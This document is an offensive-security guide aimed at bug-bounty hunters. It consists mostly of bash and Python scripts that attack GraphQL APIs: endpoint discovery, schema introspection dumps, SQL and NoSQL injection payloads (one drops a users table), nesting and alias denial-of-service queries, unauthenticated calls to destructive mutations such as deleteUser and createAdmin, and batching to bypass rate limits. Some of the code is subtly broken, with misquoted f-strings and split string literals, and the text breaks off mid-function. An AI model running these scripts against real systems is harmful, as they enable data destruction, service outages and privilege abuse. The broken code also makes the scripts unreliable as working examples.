# 🔥 GraphQL Introspection & Injection Attacks - Elite Edition

## 💰 High-Value Exploitation ($1000+ Bugs)

### 🎯 Target: GraphQL APIs & Schema Exposure

---

## 🛠️ Phase 1: GraphQL Discovery & Enumeration

### GraphQL Endpoint Discovery

```bash
#!/bin/bash
# GraphQL Endpoint Discovery Script
TARGET=$1

echo "🔍 Discovering GraphQL endpoints on $TARGET"

# Create output directory
OUTPUT_DIR="graphql_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR/{endpoints,schemas,queries,exploits,wordlists}

# Method 1: Common GraphQL endpoint patterns
echo "🌐 Testing common GraphQL endpoints..."
cat > $OUTPUT_DIR/graphql_endpoints.txt << 'EOF'
/graphql
/graphiql
/graphql/console
/graphql/graphiql
/graphql-explorer
/api/graphql
/api/graphiql
/v1/graphql
/v1/graphiql
/v2/graphql
/v2/graphiql
/admin/graphql
/admin/graphiql
/dev/graphql
/dev/graphiql
/test/graphql
/test/graphiql
/playground
/graphql-playground
/altair
/query
/queries
/gql
/graph
/graphql/schema
/graphql/introspect
/console
/explorer
/voyager
EOF

# Test each endpoint with different methods
echo "🧪 Testing GraphQL endpoints..."
while read endpoint; do
    if [ ! -z "$endpoint" ] && [[ ! "$endpoint" =~ ^# ]]; then
        echo "Testing: https://$TARGET$endpoint"
        
        # Test GET request
        get_response=$(curl -s -o /dev/null -w "%{http_code}:%{content_type}" "https://$TARGET$endpoint")
        get_code=$(echo $get_response | cut -d: -f1)
        get_type=$(echo $get_response | cut -d: -f2)
        
        # Test POST request with GraphQL query
        post_response=$(curl -s -X POST "https://$TARGET$endpoint" \
            -H "Content-Type: application/json" \
            -d '{"query": "{ __typename }"}' \
            -o /dev/null -w "%{http_code}:%{content_type}")
        post_code=$(echo $post_response | cut -d: -f1)
        post_type=$(echo $post_response | cut -d: -f2)
        
        # Check for GraphQL indicators
        if [ "$get_code" != "404" ] || [ "$post_code" != "404" ]; then
            echo "✅ Potential GraphQL endpoint: https://$TARGET$endpoint"
            echo "   GET: HTTP $get_code ($get_type)"
            echo "   POST: HTTP $post_code ($post_type)"
            
            # Test for GraphQL response
            test_response=$(curl -s -X POST "https://$TARGET$endpoint" \
                -H "Content-Type: application/json" \
                -d '{"query": "{ __typename }"}')
            
            if echo "$test_response" | grep -q "data\|errors\|__typename"; then
                echo "🎯 CONFIRMED GraphQL endpoint: https://$TARGET$endpoint"
                echo "https://$TARGET$endpoint" >> $OUTPUT_DIR/endpoints/confirmed_graphql.txt
                echo "$test_response" > "$OUTPUT_DIR/endpoints/$(echo $endpoint | tr '/' '_')_response.json"
            fi
        fi
    fi
done < $OUTPUT_DIR/graphql_endpoints.txt

# Method 2: JavaScript file analysis for GraphQL
echo "🔍 Searching JavaScript files for GraphQL references..."
echo $TARGET | katana -js-crawl -silent | while read js_url; do
    curl -s "$js_url" | grep -i "graphql\|__typename\|introspection" | head -5 >> $OUTPUT_DIR/endpoints/js_graphql_references.txt
done

# Method 3: Directory bruteforcing for GraphQL
echo "🔍 Directory bruteforcing for GraphQL endpoints..."
ffuf -w ~/wordlists/SecLists/Discovery/Web-Content/graphql.txt -u "https://$TARGET/FUZZ" -mc 200,400,405 -fs 0 -t 50 -o $OUTPUT_DIR/endpoints/ffuf_graphql.json -of json -s

# Method 4: Subdomain enumeration for GraphQL
echo "🌐 Checking subdomains for GraphQL..."
subfinder -d $TARGET -silent | httpx -silent -path "/graphql" -mc 200,400,405 -mr "graphql\|__typename" -o $OUTPUT_DIR/endpoints/subdomain_graphql.txt

echo "✅ GraphQL endpoint discovery completed"
```

### GraphQL Schema Introspection

```bash
#!/bin/bash
# GraphQL Schema Introspection Script
GRAPHQL_ENDPOINT=$1
OUTPUT_DIR=$2

echo "🔍 Performing GraphQL schema introspection..."

# Create introspection script
python3 << 'EOF'
import requests
import json
import sys
from datetime import datetime

def test_introspection(endpoint):
    """Test if GraphQL introspection is enabled"""
    
    # Basic introspection query
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    ...FullType
                }
                directives {
                    name
                    description
                    locations
                    args {
                        ...InputValue
                    }
                }
            }
        }
        
        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    ...InputValue
                }
                type {
                    ...TypeRef
                }
                isDeprecated
                deprecationReason
            }
            inputFields {
                ...InputValue
            }
            interfaces {
                ...TypeRef
            }
            enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
            }
            possibleTypes {
                ...TypeRef
            }
        }
        
        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }
        
        fragment TypeRef on __Type {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                    ofType {
                                        kind
                                        name
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
    }
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.post(endpoint, json=introspection_query, headers=headers, timeout=30)
        
        if response.status_code == 200:
            try:
                data = response.json()
                if 'data' in data and '__schema' in data['data']:
                    return True, data
                elif 'errors' in data:
                    # Check if introspection is disabled
                    error_msg = str(data['errors']).lower()
                    if 'introspection' in error_msg and ('disabled' in error_msg or 'not allowed' in error_msg):
                        return False, {"error": "Introspection disabled", "details": data['errors']}
                    else:
                        return False, {"error": "GraphQL errors", "details": data['errors']}
                else:
                    return False, {"error": "Unexpected response format", "response": data}
            except json.JSONDecodeError:
                return False, {"error": "Invalid JSON response", "response": response.text[:500]}
        else:
            return False, {"error": f"HTTP {response.status_code}", "response": response.text[:500]}
            
    except requests.RequestException as e:
        return False, {"error": f"Request failed: {str(e)}"}

def analyze_schema(schema_data):
    """Analyze GraphQL schema for security issues"""
    
    analysis = {
        'types': [],
        'queries': [],
        'mutations': [],
        'subscriptions': [],
        'sensitive_fields': [],
        'admin_operations': [],
        'dangerous_mutations': [],
        'security_issues': []
    }
    
    if 'data' not in schema_data or '__schema' not in schema_data['data']:
        return analysis
    
    schema = schema_data['data']['__schema']
    
    # Analyze types
    for type_info in schema.get('types', []):
        if type_info['name'].startswith('__'):
            continue  # Skip introspection types
            
        analysis['types'].append({
            'name': type_info['name'],
            'kind': type_info['kind'],
            'description': type_info.get('description', ''),
            'fields': [field['name'] for field in type_info.get('fields', [])]
        })
        
        # Check for sensitive field names
        if type_info.get('fields'):
            for field in type_info['fields']:
                field_name = field['name'].lower()
                sensitive_keywords = [
                    'password', 'secret', 'token', 'key', 'private', 'internal',
                    'admin', 'root', 'superuser', 'credit', 'ssn', 'social',
                    'email', 'phone', 'address', 'salary', 'confidential'
                ]
                
                if any(keyword in field_name for keyword in sensitive_keywords):
                    analysis['sensitive_fields'].append({
                        'type': type_info['name'],
                        'field': field['name'],
                        'description': field.get('description', ''),
                        'reason': f"Contains sensitive keyword: {[k for k in sensitive_keywords if k in field_name][0]}"
                    })
                
                # Check for admin operations
                admin_keywords = ['admin', 'delete', 'remove', 'destroy', 'purge', 'ban', 'suspend']
                if any(keyword in field_name for keyword in admin_keywords):
                    analysis['admin_operations'].append({
                        'type': type_info['name'],
                        'field': field['name'],
                        'description': field.get('description', ''),
                        'reason': f"Potential admin operation: {field_name}"
                    })
    
    # Analyze root operations
    query_type = schema.get('queryType', {}).get('name')
    mutation_type = schema.get('mutationType', {}).get('name')
    subscription_type = schema.get('subscriptionType', {}).get('name')
    
    for type_info in schema.get('types', []):
        if type_info['name'] == query_type and type_info.get('fields'):
            analysis['queries'] = [field['name'] for field in type_info['fields']]
        elif type_info['name'] == mutation_type and type_info.get('fields'):
            analysis['mutations'] = [field['name'] for field in type_info['fields']]
            
            # Check for dangerous mutations
            for field in type_info['fields']:
                field_name = field['name'].lower()
                dangerous_keywords = ['delete', 'remove', 'destroy', 'drop', 'truncate', 'clear', 'reset']
                if any(keyword in field_name for keyword in dangerous_keywords):
                    analysis['dangerous_mutations'].append({
                        'name': field['name'],
                        'description': field.get('description', ''),
                        'reason': f"Potentially dangerous operation: {field_name}"
                    })
        elif type_info['name'] == subscription_type and type_info.get('fields'):
            analysis['subscriptions'] = [field['name'] for field in type_info['fields']]
    
    # Security analysis
    if len(analysis['sensitive_fields']) > 0:
        analysis['security_issues'].append(f"Found {len(analysis['sensitive_fields'])} sensitive fields exposed")
    
    if len(analysis['admin_operations']) > 0:
        analysis['security_issues'].append(f"Found {len(analysis['admin_operations'])} potential admin operations")
    
    if len(analysis['dangerous_mutations']) > 0:
        analysis['security_issues'].append(f"Found {len(analysis['dangerous_mutations'])} dangerous mutations")
    
    if len(analysis['mutations']) > 20:
        analysis['security_issues'].append(f"Large number of mutations ({len(analysis['mutations'])}) - potential attack surface")
    
    return analysis

# Main execution
endpoint = sys.argv[1] if len(sys.argv) > 1 else 'https://example.com/graphql'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'schemas'

print(f"🔍 Testing GraphQL introspection on {endpoint}")

# Test introspection
introspection_enabled, result = test_introspection(endpoint)

if introspection_enabled:
    print("✅ GraphQL introspection is ENABLED!")
    
    # Save full schema
    with open(f"{output_dir}/full_schema.json", 'w') as f:
        json.dump(result, f, indent=2)
    
    # Analyze schema
    analysis = analyze_schema(result)
    
    # Save analysis
    with open(f"{output_dir}/schema_analysis.json", 'w') as f:
        json.dump(analysis, f, indent=2)
    
    # Generate summary
    print(f"📊 Schema Analysis Summary:")
    print(f"   Types: {len(analysis['types'])}")
    print(f"   Queries: {len(analysis['queries'])}")
    print(f"   Mutations: {len(analysis['mutations'])}")
    print(f"   Subscriptions: {len(analysis['subscriptions'])}")
    print(f"   Sensitive Fields: {len(analysis['sensitive_fields'])}")
    print(f"   Admin Operations: {len(analysis['admin_operations'])}")
    print(f"   Dangerous Mutations: {len(analysis['dangerous_mutations'])}")
    print(f"   Security Issues: {len(analysis['security_issues'])}")
    
    if analysis['security_issues']:
        print("
🚨 Security Issues Found:")
        for issue in analysis['security_issues']:
            print(f"   - {issue}")
    
    # Generate human-readable schema
    with open(f"{output_dir}/schema_summary.txt", 'w') as f:
        f.write("GraphQL Schema Analysis Summary
")
        f.write("=" * 40 + "

")
        f.write(f"Endpoint: {endpoint}
")
        f.write(f"Analysis Date: {datetime.now()}

")
        
        f.write("QUERIES:
")
        for query in analysis['queries']:
            f.write(f"  - {query}
")
        
        f.write("
MUTATIONS:
")
        for mutation in analysis['mutations']:
            f.write(f"  - {mutation}
")
        
        if analysis['sensitive_fields']:
            f.write("
SENSITIVE FIELDS:
")
            for field in analysis['sensitive_fields']:
                f.write(f"  - {field['type']}.{field['field']} ({field['reason']})
")
        
        if analysis['dangerous_mutations']:
            f.write("
DANGEROUS MUTATIONS:
")
            for mutation in analysis['dangerous_mutations']:
                f.write(f"  - {mutation['name']} ({mutation['reason']})
")

else:
    print("❌ GraphQL introspection is DISABLED or endpoint not accessible")
    print(f"Error details: {result}")
    
    # Save error details
    with open(f"{output_dir}/introspection_error.json", 'w') as f:
        json.dump(result, f, indent=2)
EOF
```

---

## 🔥 Phase 2: GraphQL Injection & Exploitation

### GraphQL Injection Testing

```bash
#!/bin/bash
# GraphQL Injection Testing Script
GRAPHQL_ENDPOINT=$1
OUTPUT_DIR=$2

echo "💉 Testing GraphQL injection vulnerabilities..."

# Create GraphQL injection testing script
python3 << 'EOF'
import requests
import json
import sys
import time
import urllib.parse

def test_graphql_injection(endpoint, output_dir):
    """Test various GraphQL injection techniques"""
    
    injection_results = []
    
    # SQL Injection payloads for GraphQL
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--",
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--"
    ]
    
    # NoSQL Injection payloads
    nosql_payloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '{"$or": [{"username": "admin"}, {"role": "admin"}]}'
    ]
    
    # GraphQL-specific injection payloads
    graphql_payloads = [
        '") { id } user(id: "1',  # Field injection
        '1") { password } user(id: "1',  # Field extraction
        '") { users { password } } user(id: "1',  # Schema traversal
        '") { __schema { types { name } } } user(id: "1',  # Introspection injection
    ]
    
    # Test basic query structure
    base_queries = [
        '{ user(id: "PAYLOAD") { id name } }',
        '{ users(filter: "PAYLOAD") { id name } }',
        '{ search(query: "PAYLOAD") { id name } }',
        'mutation { updateUser(id: "1", name: "PAYLOAD") { id } }',
        'mutation { createUser(input: {name: "PAYLOAD"}) { id } }'
    ]
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print("🧪 Testing SQL injection payloads...")
    for base_query in base_queries:
        for payload in sql_payloads:
            test_query = base_query.replace('PAYLOAD', payload)
            
            try:
                response = requests.post(
                    endpoint,
                    json={"query": test_query},
                    headers=headers,
                    timeout=10
                )
                
                result = {
                    'type': 'SQL Injection',
                    'payload': payload,
                    'query': test_query,
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds(),
                    'response_size': len(response.text),
                    'response_preview': response.text[:200]
                }
                
                # Check for SQL error indicators
                error_indicators = [
                    'sql', 'mysql', 'postgresql', 'oracle', 'sqlite',
                    'syntax error', 'column', 'table', 'database',
                    'constraint', 'foreign key', 'duplicate entry'
                ]
                
                response_lower = response.text.lower()
                if any(indicator in response_lower for indicator in error_indicators):
                    result['vulnerability'] = 'POTENTIAL SQL INJECTION'
                    result['confidence'] = 'HIGH'
                    print(f"🚨 Potential SQL injection found: {payload}")
                
                # Check for time-based injection
                if 'SLEEP' in payload.upper() or 'pg_sleep' in payload and response.elapsed.total_seconds() > 4:
                    result['vulnerability'] = 'TIME-BASED SQL INJECTION'
                    result['confidence'] = 'HIGH'
                    print(f"🚨 Time-based SQL injection found: {payload}")
                
                injection_results.append(result)
                
            except requests.RequestException as e:
                print(f"Request failed for payload {payload}: {e}")
            
            time.sleep(0.5)  # Rate limiting
    
    print("🧪 Testing NoSQL injection payloads...")
    for base_query in base_queries:
        for payload in nosql_payloads:
            # URL encode the payload for JSON context
            encoded_payload = json.dumps(payload).strip('"')
            test_query = base_query.replace('PAYLOAD', encoded_payload)
            
            try:
                response = requests.post(
                    endpoint,
                    json={"query": test_query},
                    headers=headers,
                    timeout=10
                )
                
                result = {
                    'type': 'NoSQL Injection',
                    'payload': payload,
                    'query': test_query,
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds(),
                    'response_size': len(response.text),
                    'response_preview': response.text[:200]
                }
                
                # Check for NoSQL error indicators
                nosql_indicators = [
                    'mongodb', 'mongoose', 'bson', 'objectid',
                    'couchdb', 'redis', 'cassandra',
                    'invalid bson', 'cast to objectid failed'
                ]
                
                response_lower = response.text.lower()
                if any(indicator in response_lower for indicator in nosql_indicators):
                    result['vulnerability'] = 'POTENTIAL NOSQL INJECTION'
                    result['confidence'] = 'MEDIUM'
                    print(f"🚨 Potential NoSQL injection found: {payload}")
                
                injection_results.append(result)
                
            except requests.RequestException as e:
                print(f"Request failed for payload {payload}: {e}")
            
            time.sleep(0.5)
    
    print("🧪 Testing GraphQL-specific injection payloads...")
    for payload in graphql_payloads:
        test_query = f'{{ user(id: "{payload}") {{ id name }} }}'
        
        try:
            response = requests.post(
                endpoint,
                json={"query": test_query},
                headers=headers,
                timeout=10
            )
            
            result = {
                'type': 'GraphQL Injection',
                'payload': payload,
                'query': test_query,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'response_size': len(response.text),
                'response_preview': response.text[:200]
            }
            
            # Check for successful field injection
            try:
                response_json = response.json()
                if 'data' in response_json:
                    # Look for unexpected fields in response
                    data_str = json.dumps(response_json['data'])
                    if 'password' in data_str or '__schema' in data_str:
                        result['vulnerability'] = 'GRAPHQL FIELD INJECTION'
                        result['confidence'] = 'HIGH'
                        print(f"🚨 GraphQL field injection found: {payload}")
            except json.JSONDecodeError:
                pass
            
            injection_results.append(result)
            
        except requests.RequestException as e:
            print(f"Request failed for payload {payload}: {e}")
        
        time.sleep(0.5)
    
    return injection_results

def test_graphql_dos(endpoint):
    """Test GraphQL Denial of Service vulnerabilities"""
    
    dos_results = []
    
    # Deep nesting attack
    nested_query = "{ user { profile { settings { preferences { theme { colors { primary"
    for i in range(50):  # Create deep nesting
        nested_query += " { nested" + str(i)
    nested_query += " } " * 52  # Close all braces
    
    # Alias-based query multiplication
    alias_query = "{ "
    for i in range(100):
        alias_query += f"user{i}: user(id: "1") {{ id name }} "
    alias_query += "}"
    
    # Recursive fragment attack
    recursive_query = """
    fragment UserFragment on User {
        id
        name
        friends {
            ...UserFragment
        }
    }
    { user(id: "1") { ...UserFragment } }
    """
    
    dos_queries = [
        ("Deep Nesting", nested_query),
        ("Alias Multiplication", alias_query),
        ("Recursive Fragment", recursive_query)
    ]
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print("🧪 Testing GraphQL DoS vulnerabilities...")
    
    for attack_name, query in dos_queries:
        try:
            start_time = time.time()
            response = requests.post(
                endpoint,
                json={"query": query},
                headers=headers,
                timeout=30
            )
            end_time = time.time()
            
            result = {
                'attack_type': attack_name,
                'query_length': len(query),
                'response_time': end_time - start_time,
                'status_code': response.status_code,
                'response_size': len(response.text),
                'response_preview': response.text[:200]
            }
            
            # Check for DoS indicators
            if result['response_time'] > 10:
                result['vulnerability'] = 'POTENTIAL DOS - SLOW RESPONSE'
                result['confidence'] = 'MEDIUM'
                print(f"🚨 Potential DoS found: {attack_name} (Response time: {result['response_time']:.2f}s)")
            
            if response.status_code == 500:
                result['vulnerability'] = 'POTENTIAL DOS - SERVER ERROR'
                result['confidence'] = 'MEDIUM'
                print(f"🚨 Server error caused by: {attack_name}")
            
            dos_results.append(result)
            
        except requests.Timeout:
            result = {
                'attack_type': attack_name,
                'vulnerability': 'DOS - TIMEOUT',
                'confidence': 'HIGH',
                'response_time': 30,
                'error': 'Request timeout'
            }
            dos_results.append(result)
            print(f"🚨 DoS confirmed: {attack_name} (Timeout)")
            
        except requests.RequestException as e:
            print(f"Request failed for {attack_name}: {e}")
        
        time.sleep(2)  # Longer delay for DoS tests
    
    return dos_results

# Main execution
endpoint = sys.argv[1] if len(sys.argv) > 1 else 'https://example.com/graphql'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'exploits'

print(f"💉 Testing GraphQL injection on {endpoint}")

# Test injections
injection_results = test_graphql_injection(endpoint, output_dir)

# Test DoS
dos_results = test_graphql_dos(endpoint)

# Combine results
all_results = {
    'endpoint': endpoint,
    'injection_tests': injection_results,
    'dos_tests': dos_results,
    'summary': {
        'total_injection_tests': len(injection_results),
        'potential_vulnerabilities': len([r for r in injection_results if 'vulnerability' in r]),
        'dos_vulnerabilities': len([r for r in dos_results if 'vulnerability' in r])
    }
}

# Save results
with open(f"{output_dir}/graphql_injection_results.json", 'w') as f:
    json.dump(all_results, f, indent=2)

print(f"✅ GraphQL injection testing completed")
print(f"   Injection tests: {all_results['summary']['total_injection_tests']}")
print(f"   Potential vulnerabilities: {all_results['summary']['potential_vulnerabilities']}")
print(f"   DoS vulnerabilities: {all_results['summary']['dos_vulnerabilities']}")
EOF
```

---

## 🚀 Phase 3: Advanced GraphQL Exploitation

### GraphQL Authorization Bypass

```bash
#!/bin/bash
# GraphQL Authorization Bypass Testing
GRAPHQL_ENDPOINT=$1
OUTPUT_DIR=$2

echo "🔓 Testing GraphQL authorization bypass..."

# Create authorization bypass testing script
python3 << 'EOF'
import requests
import json
import sys
import itertools

def test_field_level_authorization(endpoint, output_dir):
    """Test for field-level authorization bypass"""
    
    bypass_results = []
    
    # Common sensitive fields to test
    sensitive_fields = [
        'password', 'email', 'phone', 'ssn', 'creditCard',
        'salary', 'address', 'privateKey', 'secret', 'token',
        'adminNotes', 'internalId', 'permissions', 'roles'
    ]
    
    # Test queries with different user contexts
    test_queries = [
        # Direct field access
        '{{ user(id: "1") {{ id name {field} }} }}',
        '{{ users {{ id name {field} }} }}',
        
        # Nested field access
        '{{ user(id: "1") {{ profile {{ {field} }} }} }}',
        '{{ user(id: "1") {{ account {{ {field} }} }} }}',
        
        # Through relationships
        '{{ user(id: "1") {{ posts {{ author {{ {field} }} }} }} }}',
        '{{ user(id: "1") {{ friends {{ {field} }} }} }}',
        
        # Alias-based access
        '{{ user1: user(id: "1") {{ {field} }} user2: user(id: "2") {{ {field} }} }}',
        
        # Fragment-based access
        '''
        fragment UserInfo on User {{ {field} }}
        {{ user(id: "1") {{ ...UserInfo }} }}
        '''
    ]
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print("🔍 Testing field-level authorization bypass...")
    
    for field in sensitive_fields:
        for query_template in test_queries:
            query = query_template.format(field=field)
            
            try:
                # Test without authentication
                response_unauth = requests.post(
                    endpoint,
                    json={"query": query},
                    headers=headers,
                    timeout=10
                )
                
                # Test with different authorization headers
                auth_headers = [
                    {'Authorization': 'Bearer invalid_token'},
                    {'Authorization': 'Bearer expired_token'},
                    {'Authorization': 'Basic invalid_creds'},
                    {'X-API-Key': 'invalid_key'},
                    {'Cookie': 'session=invalid_session'}
                ]
                
                for auth_header in auth_headers:
                    test_headers = {**headers, **auth_header}
                    
                    response_auth = requests.post(
                        endpoint,
                        json={"query": query},
                        headers=test_headers,
                        timeout=10
                    )
                    
                    # Analyze responses
                    result = analyze_authorization_response(
                        field, query, response_unauth, response_auth, auth_header
                    )
                    
                    if result:
                        bypass_results.append(result)
                        print(f"🚨 Authorization bypass found for field: {field}")
                
            except requests.RequestException as e:
                print(f"Request failed for field {field}: {e}")
    
    return bypass_results

def analyze_authorization_response(field, query, response_unauth, response_auth, auth_header):
    """Analyze responses for authorization bypass indicators"""
    
    try:
        # Parse responses
        data_unauth = response_unauth.json() if response_unauth.status_code == 200 else None
        data_auth = response_auth.json() if response_auth.status_code == 200 else None
        
        # Check if sensitive field is accessible without proper auth
        if data_unauth and 'data' in data_unauth:
            data_str = json.dumps(data_unauth['data'])
            if field in data_str and 'null' not in data_str:
                return {
                    'vulnerability': 'FIELD-LEVEL AUTHORIZATION BYPASS',
                    'field': field,
                    'query': query,
                    'auth_header': auth_header,
                    'confidence': 'HIGH',
                    'response_unauth': data_unauth,
                    'response_auth': data_auth,
                    'description': f"Sensitive field '{field}' accessible without proper authorization"
                }
        
        # Check for different responses between auth states
        if (data_unauth and data_auth and 
            json.dumps(data_unauth) != json.dumps(data_auth)):
            return {
                'vulnerability': 'INCONSISTENT AUTHORIZATION',
                'field': field,
                'query': query,
                'auth_header': auth_header,
                'confidence': 'MEDIUM',
                'response_unauth': data_unauth,
                'response_auth': data_auth,
                'description': f"Different responses for field '{field}' with different auth states"
            }
    
    except json.JSONDecodeError:
        pass
    
    return None

def test_mutation_authorization(endpoint, output_dir):
    """Test for mutation authorization bypass"""
    
    mutation_results = []
    
    # Common dangerous mutations to test
    dangerous_mutations = [
        'deleteUser', 'removeUser', 'banUser', 'suspendUser',
        'updateUserRole', 'grantPermission', 'revokePermission',
        'deletePost', 'removePost', 'moderateContent',
        'updateSettings', 'changePassword', 'resetPassword',
        'createAdmin', 'promoteUser', 'demoteUser'
    ]
    
    # Test mutation templates
    mutation_templates = [
        'mutation {{ {mutation}(id: "1") {{ success message }} }}',
        'mutation {{ {mutation}(userId: "1", role: "admin") {{ success }} }}',
        'mutation {{ {mutation}(input: {{id: "1", active: false}}) {{ success }} }}',
    ]
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print("🔍 Testing mutation authorization bypass...")
    
    for mutation in dangerous_mutations:
        for template in mutation_templates:
            query = template.format(mutation=mutation)
            
            try:
                # Test without authentication
                response = requests.post(
                    endpoint,
                    json={"query": query},
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if ('data' in data and data['data'] and 
                            not any('error' in str(v).lower() for v in data.get('errors', []))):
                            
                            mutation_results.append({
                                'vulnerability': 'MUTATION AUTHORIZATION BYPASS',
                                'mutation': mutation,
                                'query': query,
                                'confidence': 'HIGH',
                                'response': data,
                                'description': f"Dangerous mutation '{mutation}' executable without authorization"
                            })
                            print(f"🚨 Mutation bypass found: {mutation}")
                    
                    except json.JSONDecodeError:
                        pass
                
            except requests.RequestException as e:
                print(f"Request failed for mutation {mutation}: {e}")
    
    return mutation_results

# Main execution
endpoint = sys.argv[1] if len(sys.argv) > 1 else 'https://example.com/graphql'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'exploits'

print(f"🔓 Testing GraphQL authorization bypass on {endpoint}")

# Test field-level authorization
field_results = test_field_level_authorization(endpoint, output_dir)

# Test mutation authorization
mutation_results = test_mutation_authorization(endpoint, output_dir)

# Combine results
all_results = {
    'endpoint': endpoint,
    'field_authorization_tests': field_results,
    'mutation_authorization_tests': mutation_results,
    'summary': {
        'field_bypasses': len(field_results),
        'mutation_bypasses': len(mutation_results),
        'total_vulnerabilities': len(field_results) + len(mutation_results)
    }
}

# Save results
with open(f"{output_dir}/graphql_authorization_bypass.json", 'w') as f:
    json.dump(all_results, f, indent=2)

print(f"✅ GraphQL authorization testing completed")
print(f"   Field bypasses: {all_results['summary']['field_bypasses']}")
print(f"   Mutation bypasses: {all_results['summary']['mutation_bypasses']}")
print(f"   Total vulnerabilities: {all_results['summary']['total_vulnerabilities']}")
EOF

echo "✅ GraphQL introspection and injection analysis completed"
```

### GraphQL Batching & Rate Limit Bypass

```bash
#!/bin/bash
# GraphQL Batching Attack Script
GRAPHQL_ENDPOINT=$1
OUTPUT_DIR=$2

echo "⚡ Testing GraphQL batching and rate limit bypass..."

# Create batching attack script
python3 << 'EOF'
import requests
import json
import sys
import time
import concurrent.futures

def test_query_batching(endpoint, output_dir):
    """Test GraphQL query batching for rate limit bypass"""
    
    batching_results = []
    
    # Test different batch sizes
    batch_sizes = [5, 10, 25, 50, 100, 200]
    
    # Base query for testing
    base_query = '{ user(id: "1") { id name email } }'
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print("🔍 Testing query batching...")
    
    for batch_size in batch_sizes:
        print(f"Testing batch size: {batch_size}")
        
        # Create batch of queries
        batch_queries = []
        for i in range(batch_size):
            batch_queries.append({
                "query": base_query,
                "variables": {},
                "operationName": f"Query{i}"
            })
        
        try:
            start_time = time.time()
            
            # Send batched request
            response = requests.post(
                endpoint,
                json=batch_queries,
                headers=headers,
                timeout=30
            )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            result = {
                'batch_size': batch_size,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_size': len(response.text),
                'queries_per_second': batch_size / response_time if response_time > 0 else 0
            }
            
            # Check if batching is supported
            if response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list) and len(data) == batch_size:
                        result['batching_supported'] = True
                        result['vulnerability'] = 'RATE LIMIT BYPASS VIA BATCHING'
                        result['confidence'] = 'HIGH'
                        print(f"✅ Batching supported for {batch_size} queries")
                        print(f"   Queries per second: {result['queries_per_second']:.2f}")
                    else:
                        result['batching_supported'] = False
                except json.JSONDecodeError:
                    result['batching_supported'] = False
            else:
                result['batching_supported'] = False
            
            batching_results.append(result)
            
        except requests.RequestException as e:
            print(f"Request failed for batch size {batch_size}: {e}")
        
        time.sleep(1)  # Brief delay between tests
    
    return batching_results

def test_alias_multiplication(endpoint, output_dir):
    """Test alias-based query multiplication"""
    
    alias_results = []
    
    # Test different numbers of aliases
    alias_counts = [10, 25, 50, 100, 200, 500]
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print("🔍 Testing alias multiplication...")
    
    for alias_count in alias_counts:
        print(f"Testing {alias_count} aliases...")
        
        # Create query with multiple aliases
        query = "{ "
        for i in range(alias_count):
            query += f"user{i}: user(id: "1") {{ id name }} "
        query += "}"
        
        try:
            start_time = time.time()
            
            response = requests.post(
                endpoint,
                json={"query": query},
                headers=headers,
                timeout=30
            )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            result = {
                'alias_count': alias_count,
                'query_length': len(query),
                'status_code': response.status_code,
                'response_time': response_time,
                'response_size': len(response.text)
            }
            
            # Check for successful alias multiplication
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'data' in data and len(str(data['data'])) > alias_count * 10:
                        result['vulnerability'] = 'ALIAS MULTIPLICATION ATTACK'
                        result['confidence'] = 'HIGH'
                        result['effective_queries'] = alias_count
                        print(f"✅ Alias multiplication successful: {alias_count} queries in one request")
                except json.JSONDecodeError:
                    pass
            
            # Check for performance impact
            if response_time > 5:
                result['performance_impact'] = 'HIGH'
                print(f"⚠️ High response time: {response_time:.2f}s for {alias_count} aliases")
            
            alias_results.append(result)
            
        except requests.RequestException as e:
            print(f"Request failed for {alias_count} aliases: {e}")
        
        time.sleep(1)
    
    return alias_results

def test_concurrent_requests(endpoint, output_dir):
    """Test concurrent request handling"""
    
    concurrent_results = []
    
